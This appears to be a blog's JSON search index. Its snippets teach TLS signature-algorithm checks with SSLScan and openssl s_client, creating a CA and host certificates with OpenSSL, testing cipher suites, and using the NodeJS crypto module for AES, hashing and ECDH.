algorithm that is used for the integrity check of the data.Notice that all of the Server Signature Algorithms have something in common. They all use RSA. So why are they all RSA and not ECDSA or DSA?Remember earlier we said the Host Certificate uses RSA by observing the SSL Certificate section. This means the Host Private key is an RSA key. Therefore, when we encrypt something using the Host Private key, it must use RSA encryption.To think about it another way, let’s imagine that one of the algorithms listed in the Server Signature Algorithm(s) section said it uses ECDSA instead of RSA. This would imply that the ephemeral Public key sent during the TLS setup was signed using an ECC key. This is not possible because the Host Private key is an RSA key not an ECC key.Edge Case 1SSLScan False PositivesUnfortunately SSLScan is not perfect, and sometimes we get incorrect results. Let’s look at how to identify false positives and found out the correct results.Have a look at the SSLScan results of adventofcode.com below. See if you can identify what is wrong:From the SSL Certificate section we can see that this Host Certificate is RSA. Because of this, and what we learnt about what the Signature Algorithms are for, it doesn’t make sense for there to be ECDSA or DSA algorithms.If this happens then there has most likely been an error with SSLScan. We can verify the results using manually using openssl. Let’s see how to do that now.Verifying False PositivesUsing openssl we can connect to a target and specify the Signature Algorithm we wish to use. If you’re unsure how to do this, I have a quick guide with all the commands here:Testing dsa_sha256:Testing ecdsa_secp256r1_sha256:Testing rsa_pkcs1_sha256:Skipping over some of the output:At the end of the Certificate we can see the information about the Server Signature. The Peer signing digest: is set to SHA256, which is the hash function we specified. The Peer signature type: is set to RSA which is also what we specified.From the above outputs we can see that the server does indeed only supported RSA Signature Algorithms (as it should). We now know there were false positives within the SSLScan.Edge Case 2Dual CertificatesBelow is the SSLScan results of facebook.com below. Just like the first edge case we can see that there are signature algorithms that don’t match the host certificate. The Host Certificate is ECC and it doesn’t make sense for there to be RSA algorithms under the Server Signature Algorithm(s) section.Using the same process as the first edge case, let’s see what’s happening:Testing rsa_pkcs1_sha256:openssl s_client -connect facebook.com:443 -sigalgs &quot;RSS-PSS+SHA256&quot;Skipping to the end of the certificate output:Testing ecdsa_secp256r1_sha256:openssl s_client -connect facebook.com:443 -sigalgs &quot;ECDSA+SHA256&quot;Skipping to the end of the certificate output:This output is perplexing. Why did both signature algorithms work when the certificate is ECC?How does this make sense?As always, the devil is in the details. If we closely examine the output from both commands you can see that the certificates returned are different!This makes more sense. The server is sending us a different certificate based on what signature algorithm is used. When we use an RSA Signature Algorithm, we get an RSA Certificate. When we use an ECC Signature Algorithm, we get an ECC Certificate.Conclusion The Signature Algorithm is used for encrypting and signing the ephemeral public key during the TLS connection setup. SSLScan is not 100% reliable. OpenSSL should be used to verify results manually if the results don’t appear to make sense.References TLSv1.2 Illustration TLSv1.2 RFC" }, { "title": "OpenSSL Creating a Host Certificate", "url": "/posts/openssl-creating-a-host-certificate/", "categories": "security, certificates", "tags": "openssl, certificate, host, security, cryptography, https", "date": "2021-04-07 22:03:48 +1100", "snippet": "In this post we’ll look at how to create our own Host Certificates using OpenSSL. These certificates can be used on web-servers for enabling TLS.A valid CA Certificate and Private key will be required to follow this tutorial. If you do not have these, you can create them by following this guide. Generating a Private Key List OpenSSL Support Elliptic Curves Elliptic Curve Private Key RSA Private Key Generating a Certificate Signing Request (CSR) CSR Configuration File Creating the CSR Generating a Certificate Configuration File Signing the CSR Using the CertificateGenerating a Private KeyThe first step is to create a Private key for our certificate. We can choose either an RSA key or an Elliptic Curve key.List OpenSSL Supported Elliptic CurvesThe following command will display a list of supported OpenSSL elliptic curves. We’ll need to choose one of these curves when we are generating our Private key.openssl ecparam -list_curvesElliptic Curve Private Keyopenssl ecparam -genkey -name secp384r1 -out host.key secp384r1 is the name of the curve we are using. host.key is the name of the output file where we want to store the Private key.RSA Private KeyThe following command will generate a 2048-bit RSA key:openssl genrsa -out host.key2048-bits is the standard size. A custom key size can be specified by giving an extra argument. The following command will generate a 4096-bit RSA key:openssl genrsa -out host.key 4096Generating a Certificate Signing Request (CSR)CSR Configuration FileWe need to specify some parameters for our certificate before we can create it.Create a file called host.conf and add the following:[req]default_md = sha512basicConstraints = CA:FALSEkeyUsage = nonRepudiation, digitalSignature, keyEncipherment[req]distinguished_name = req_distinguished_namereq_extensions = req_extprompt = no[req_distinguished_name]C = AUST = VictoriaL = MelbourneO = My CompanyOU = My DivisionCN = testing.com[req_ext]subjectAltName = @alt_names[alt_names]DNS.1 = testing.comDNS.2 = *.testing.com Customize the C, ST, L, O, OU and CN to your desired values.The CN (Common Name) field will be displayed when your computer shows the certificate path:The DNS.* fields represent other domains that this certificate will also be valid for. Remember that a certificate valid for *.testing.com is NOT valid for testing.com, so it must be added separately.Creating the CSRWe are now ready to create a certificate signing request (CSR) using the private key and config we just created. The CSR will then need to be signed by a CA before it can be used.openssl req -new -sha512 -nodes -key host.key -out host.csr -config host.confGenerating a CertificateConfiguration FileWe need to specify some extra parameters so that our final certificate will be fully trusted X.509 Cert.Create a file called host-ext.conf and add the following:basicConstraints = CA:FALSEnsCertType = servernsComment = &quot;My First Certificate&quot;subjectKeyIdentifier = hashauthorityKeyIdentifier = keyid,issuer:alwayskeyUsage = nonRepudiation, digitalSignature, keyEnciphermentextendedKeyUsage = serverAuthsubjectAltName = @alt_names[alt_names]DNS.1 = testing.comDNS.2 = *.testing.com Update the nsComment and DNS.* fields to your desired values.Signing the CSRWe are now ready to sign the CSR using a CA and 2nd config file we created. The output will be our Certificate that is ready to be used.openssl x509 -req -sha512 -days 45 -in host.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out host.crt -extfile host-ext.confUsing the CertificateThe output files host.key and host.crt are now ready to be used for a HTTPS server. If your browser trusts the Root CA that was used to sign the CSR then the host certificate will be valid and trusted." }, { "title": "OpenSSL Creating a Certificate Authority (CA)", "url": "/posts/openssl-creating-a-ca/", "categories": "security, certificates", "tags": "openssl, ca, certificate, security, cryptography", "date": "2021-04-07 20:17:22 +1100", "snippet": "In this post we’ll look at how to create our own Certificate Authority (CA) using OpenSSL. Generating a Private Key List OpenSSL Support Elliptic Curves Elliptic Curve Private Key RSA Private Key Generating a Certificate Configuration File Creating the Certificate Using the CAGenerating a Private KeyThe first step is to create a Private key for our certificate. We can choose either an RSA key or an Elliptic Curve key.List OpenSSL Supported Elliptic CurvesThe following command will display a list of supported OpenSSL elliptic curves. We’ll need to choose one of these curves when we are generating our Private key.openssl ecparam -list_curvesElliptic Curve Private Keyopenssl ecparam -genkey -name secp384r1 -out ca.key secp384r1 is the name of the curve we are using. ca.key is the name of the output file where we want to store the Private key.RSA Private KeyThe following command will generate a 2048-bit RSA key:openssl genrsa -out ca.key2048-bits is the standard size. A custom key size can be specified by giving an extra argument. The following command will generate a 4096-bit RSA key:openssl genrsa -out ca.key 4096Generating a CertificateCA Configuration FileWe need to specify some parameters for our CA before we can create it.Create a file called ca.conf and add the following:basicConstraints = CA:TRUEkeyUsage = cRLSign, keyCertSign[req]distinguished_name = req_distinguished_nameprompt = no[req_distinguished_name]C = AUST = VictoriaL = MelbourneCN = My Personal Root CA Customize the C, ST, L and CN to your desired values.The CN (Common Name) field will be displayed when your computer shows the certificate path:Creating the CertificateWe are now ready to create the certificate using the private key and config:openssl req -x509 -new -sha512 -nodes -key ca.key -days 7307 -out ca.crt -config ca.conf -x509 output a Certificate instead of a Certificate Signing Request (CSR). -sha512 specifies the hash function that will be used to sign the certificate. Other values may be used here such as sha256 and sha384. -nodes means the certificate should be unencrypted. -key ca.key specifies the Private Key we are signing this with. -days 7307 specifies the number of days the certificate is valid for. 7307 days ≈ 20 years. -out ca.crt specifies the output file name. -config ca.conf specifies the configuration file we wish to use.Using the CANow that we have our own Certificate Authority, we can use it sign certificates for web-servers so they can use TLS. I have a guide to do this here.If we want to use the CA and not have certificate warnings, then it will have to be installed as a Trusted Root CA on your computer/browser." }, { "title": "OpenSSL Testing a Signature Algorithm", "url": "/posts/openssl-testing-signature-algorithm/", "categories": "security, certificates", "tags": "tls, security, cryptography, openssl, signature, algorithm", "date": "2021-04-07 01:44:00 +1100", "snippet": "In this post we’ll look at how to test whether a server supports a certain signature algorithm when using TLS. Testing RSA PKCS1 Signature Algorithm Testing RSA PSS RSAE Signature Algorithm Testing DSA Signature Algorithm Testing ECDSA Signature Algorithm Verifying ResultsBelow we have the SSLScan results of github.com. Let’s see how to verify if a certain signature algorithm is supported by the server.For all of the below commands SHA256 may be replaced with the desired hash function: SHA1 SHA224 SHA256 SHA384 SHA512Testing RSA PKCS1An example algorithm in this category is rsa_pkcs1_sha256:openssl s_client -connect HOST:PORT -sigalgs &quot;RSA+SHA256&quot;Testing RSA PSS RSAEAn example algorithm in this category is rsa_pss_rsae_sha256:openssl s_client -connect HOST:PORT -sigalgs &quot;RSA-PSS+SHA256&quot;Testing DSAAn example algorithm in this category is dsa_sha256:openssl s_client -connect HOST:PORT -sigalgs &quot;DSA+SHA256&quot;Testing ECDSAAn example algorithm in this category is ecdsa_secp256r1_sha256:openssl s_client -connect HOST:PORT -sigalgs &quot;ECDSA+SHA256&quot;Verifying ResultsWhen running one of the above commands you should see the certificate printed out, and below that you should see two fields Peer signing digest: and Peer signature type:. These will be the values that you provided to the -sigalgs parameter.If the certificate is NOT printed, then the signature algorithm you provided is not supported by the server.The below image is the output of the following command:openssl s_client -connect github.com:443 -sigalgs &quot;RSA-PSS+SHA256&quot;The highest version of TLS supported by the server will be used by default. If you want to test a signature algorithm for TLSv1.2 or TLSv1.3 you can use the flags -tls1_2 and -tls1_3 respectively:openssl s_client -connect github.com:443 -tls1_2 -sigalgs &quot;RSA-PSS+SHA256&quot;Notes Make sure you specify a port number at the end of the host name! SSLScan results can be incorrect. Some of the algorithms shown may not work. You can use the aforementioned commands to verify the results." }, { "title": "OpenSSL Testing a Cipher Suite", "url": "/posts/openssl-testing-cipher-suite/", "categories": "security, certificates", "tags": "security, cryptography, openssl, cipher, ciphersuite", "date": "2021-04-06 20:46:40 +1100", "snippet": "In this post we’ll look at how to test whether a server supports a certain cipher suite when using TLS. Testing Ciphers for TLSv1.2 &amp;amp; Below Testing Other TLS Versions Testing TLSv1.3 CiphersBelow we have the SSLScan results of github.com. Let’s see how to verify if a certain cipher works.Testing Ciphers for TLSv1.2 &amp;amp; Belowopenssl s_client -connect github.com:443 -tls1_2 -cipher AES128-SHA256Testing Other TLS VersionsIf you want to test ciphers for other versions of TLS such as v1.0 &amp;amp; v1.1, you should replace -tls1_2 in the above command with -tls1 and -tls1_1 respectively.Testing TLSv1.3 Ciphersopenssl s_client -connect github.com:443 -ciphersuites TLS_AES_128_GCM_SHA256When testing a TLSv1.3 cipher you shouldn’t need to specify the TLS version. If the wrong version is being used you can specify TLSv1.3 by using the -tls1_3 flag.Notes Make sure you specific a port number at the end of the host name. Depending on the version of OpenSSL you have installed, certain ciphers may or may not be supported." }, { "title": "NodeJS Crypto Module", "url": "/posts/nodejs-crypto/", "categories": "javascript, nodejs", "tags": "javascript, nodejs, security, cryptography", "date": "2021-04-06 19:37:40 +1100", "snippet": "In this post we’ll look at how to use some features of the crypto library built into NodeJS. We’ll look at how to do symmetric encryption (AES), hashing strings and files, and finally ECDH (Elliptic-Curve Diffie-Hellman). Symmetric Encryption List Supported Ciphers Encrypt String with AES-128-ECB Encrypt String with AES-256-CBC Encrypt String with AES-256-GCM Hash Functions List Supported Hash Functions Hashing a String Example Hashing a File Example Elliptic-Curve Diffie-Hellman List Supported Curves ECDH Example Symmetric EncryptionFor a quick refresher, Symmetric Encryption is when only a single key is used. The same key is used for both encryption and decryption of the data.Supported CiphersWe can see which ciphers are supported in NodeJS by using the following code:const crypto = require(&#39;crypto&#39;); console.log(crypto.getCiphers()); crypto.getCiphers() returns a list of strings of all the ciphers that are supported. From the list we’ll choose aes-256-ctr. Let’s now see how to encrypt &amp;amp; decrypt some data using our chosen mode.Encrypt String with AES-128-ECBconst crypto = require(&#39;crypto&#39;);let key = Buffer.from(&#39;ABCDEFGHIJKLMNOP&#39;, &#39;utf-8&#39;);// The Secret Messagelet secret_msg = Buffer.from(&#39;To be Encrypted!&#39;, &#39;utf-8&#39;);// Encryptlet cipher = crypto.createCipheriv(&#39;aes-128-ecb&#39;, key, null);let encryptedData = Buffer.concat([cipher.update(secret_msg), cipher.final()]);// Decryptlet decipher = crypto.createDecipheriv(&#39;aes-128-ecb&#39;, key, null);let decryptedData = Buffer.concat([decipher.update(encryptedData), decipher.final()]);console.log(`\\nEncryption Key: ${key.toString(&#39;hex&#39;)}`)console.log(`Plain-text: \\t&quot;${secret_msg}&quot;`);console.log(`Plain-text: \\t${secret_msg.toString(&#39;hex&#39;)}`);console.log(`Encrypted: \\t${encryptedData.toString(&#39;hex&#39;)}`);console.log(`Encrypted: \\t${encryptedData.toString(&#39;base64&#39;)}`);console.log(`Decrypted: \\t${decryptedData.toString(&#39;hex&#39;)}`);console.log(`Decrypted: \\t&quot;${decryptedData.toString(&#39;utf-8&#39;)}&quot;`); This is just an example, please don’t ever use ECB in practice.Encrypt String with AES-256-CBCconst crypto = require(&#39;crypto&#39;);let key = Buffer.from(&#39;ABCDEFGHIJKLMNOPabcdefghijklmnop&#39;, &#39;utf-8&#39;);let iv = Buffer.from(&#39;000102030405060708090a0b0c0d0e0f&#39;, &#39;hex&#39;);// The Secret Messagelet secret_msg = Buffer.from(&#39;To be Encrypted!&#39;, &#39;utf-8&#39;);// Encryptlet cipher = crypto.createCipheriv(&#39;aes-256-cbc&#39;, key, iv);let encryptedData = Buffer.concat([cipher.update(secret_msg), cipher.final()]);// Decryptlet decipher = crypto.createDecipheriv(&#39;aes-256-cbc&#39;, key, iv);let decryptedData = Buffer.concat([decipher.update(encryptedData), decipher.final()]);console.log(`\\nEncryption Key: ${key.toString(&#39;hex&#39;)}`)console.log(`IV: \\t\\t${iv.toString(&#39;hex&#39;)}\\n`)console.log(`Plain-text: \\t&quot;${secret_msg}&quot;`);console.log(`Plain-text: \\t${secret_msg.toString(&#39;hex&#39;)}`);console.log(`Encrypted: \\t${encryptedData.toString(&#39;hex&#39;)}`);console.log(`Encrypted: \\t${encryptedData.toString(&#39;base64&#39;)}`);console.log(`Decrypted: \\t${decryptedData.toString(&#39;hex&#39;)}`);console.log(`Decrypted: \\t&quot;${decryptedData.toString(&#39;utf-8&#39;)}&quot;`);Encrypt String with AES-256-GCMconst crypto = require(&#39;crypto&#39;);let key = Buffer.from(&#39;ABCDEFGHIJKLMNOPabcdefghijklmnop&#39;, &#39;utf-8&#39;);let iv = Buffer.from(&#39;000102030405060708090a0b0c0d0e0f&#39;, &#39;hex&#39;);let authTagLength = 16;// The Secret Messagelet secret_msg = Buffer.from(&#39;To be Encrypted!&#39;, &#39;utf-8&#39;);// Encryptlet cipher = crypto.createCipheriv(&#39;aes-256-gcm&#39;, key, iv, { authTagLength });let encryptedData = Buffer.concat([cipher.update(secret_msg), cipher.final(), cipher.getAuthTag()]);// Separate the encrypted data from the Auth Taglet dataToDecrypt = encryptedData.slice(0, encryptedData.length - authTagLength);let authTag = encryptedData.slice(encryptedData.length - authTagLength, encryptedData.length);// Decryptlet decipher = crypto.createDecipheriv(&#39;aes-256-gcm&#39;, key, iv, { authTagLength });decipher.setAuthTag(authTag);let decryptedData = Buffer.concat([decipher.update(dataToDecrypt), decipher.final()]);console.log(`\\nEncryption Key: ${key.toString(&#39;hex&#39;)}`)console.log(`IV: \\t\\t${iv.toString(&#39;hex&#39;)}\\n`)console.log(`Plain-text: \\t&quot;${secret_msg}&quot;`);console.log(`Plain-text: \\t${secret_msg.toString(&#39;hex&#39;)}`);console.log(`Encrypted: \\t${encryptedData.toString(&#39;hex&#39;)}`);console.log(`Encrypted: \\t${encryptedData.toString(&#39;base64&#39;)}`);console.log(`Decrypted: \\t${decryptedData.toString(&#39;hex&#39;)}`);console.log(`Decrypted: \\t&quot;${decryptedData.toString(&#39;utf-8&#39;)}&quot;`);Hash FunctionsList Supported Hash FunctionsWe can see which hash functions are supported in NodeJS by using the following code:const crypto = require(&#39;crypto&#39;);console.log(crypto.getHashes());crypto.getHashes() returns a list of strings of all the hash functions that are supported.Hashing a String Exampleconst crypto = require(&#39;crypto&#39;);// String to be hashedlet msgToHash = &#39;Password1&#39;;// Create Hash Functionslet MD4_HashFunction = crypto.createHash(&#39;md4&#39;);let NTLM_HashFunction = crypto.createHash(&#39;md4&#39;);let SHA256_HashFunction = crypto.createHash(&#39;sha256&#39;);let SHA3_256_HashFunction = crypto.createHash(&#39;sha3-256&#39;);// Add data to the hash functionMD4_HashFunction.update(msgToHash);NTLM_HashFunction.update(Buffer.from(msgToHash, &#39;utf16le&#39;));SHA256_HashFunction.update(msgToHash);SHA3_256_HashFunction.update(msgToHash);// Get the resultconsole.log(&#39;MD4:\\t\\t&#39;, MD4_HashFunction.digest(&#39;hex&#39;));console.log(&#39;NTLM:\\t\\t&#39;, NTLM_HashFunction.digest(&#39;hex&#39;));console.log(&#39;SHA256:\\t\\t&#39;, SHA256_HashFunction.digest(&#39;hex&#39;));console.log(&#39;SHA3-256:\\t&#39;, SHA3_256_HashFunction.digest(&#39;hex&#39;));The update function can be called multiple times before getting the output hash. For example:SHA256_HashFunction.update(&quot;Pass&quot;);SHA256_HashFunction.update(&quot;word1&quot;);is the same as:SHA256_HashFunction.update(&quot;Password1&quot;);Hashing a File Exampleconst fs = require(&#39;fs&#39;);const path = require(&#39;path&#39;);const crypto = require(&#39;crypto&#39;);// Target file that we what to calculate the hash ofconst targetFile = path.join(__dirname, &#39;input-file.txt&#39;);// Create Hash Functionconst SHA256_HashFunction = crypto.createHash(&#39;sha256&#39;);SHA256_HashFunction.setEncoding(&#39;hex&#39;);// Create a read stream with the target fileconst inputFileStream = fs.createReadStream(targetFile);// Callback for when Hashing is completeinputFileStream.on(&#39;end&#39;, () =&amp;gt; { SHA256_HashFunction.end(); console.log(SHA256_HashFunction.read());});// Read the file contents and pipe it into the hash objectinputFileStream.pipe(SHA256_HashFunction);Elliptic-Curve Diffie-HellmanSupported CurvesWe can see which curves are supported in NodeJS by using the following code:const crypto = require(&#39;crypto&#39;);console.log(crypto.getCurves());crypto.getCurves() returns a list of strings of all the elliptic curves that are supported. We’ll use the sect571k1 curve in the below example.ECDH Exampleconst crypto = require(&#39;crypto&#39;);const alice = crypto.createECDH(&#39;sect571k1&#39;);alice.generateKeys();const bob = crypto.createECDH(&#39;sect571k1&#39;);bob.generateKeys();// Alice&#39;s Dataconsole.log(&quot;\\nAlice Public:&quot;, alice.getPublicKey().toString(&#39;base64&#39;));console.log(&quot;Alice Private:&quot;, alice.getPrivateKey().toString(&#39;base64&#39;), &quot;\\n&quot;);// Bob&#39;s Dataconsole.log(&quot;Bob Public:&quot;, bob.getPublicKey().toString(&#39;base64&#39;));console.log(&quot;Bob Private:&quot;, bob.getPrivateKey().toString(&#39;base64&#39;), &quot;\\n&quot;);// The Shared Secret will be the sameconsole.log(&quot;Shared Secret: &quot;, alice.computeSecret(bob.getPublicKey(), null, &#39;base64&#39;));console.log(&quot;Shared Secret: &quot;, bob.computeSecret(alice.getPublicKey(), null, &#39;base64&#39;), &quot;\\n&quot;);" } ]
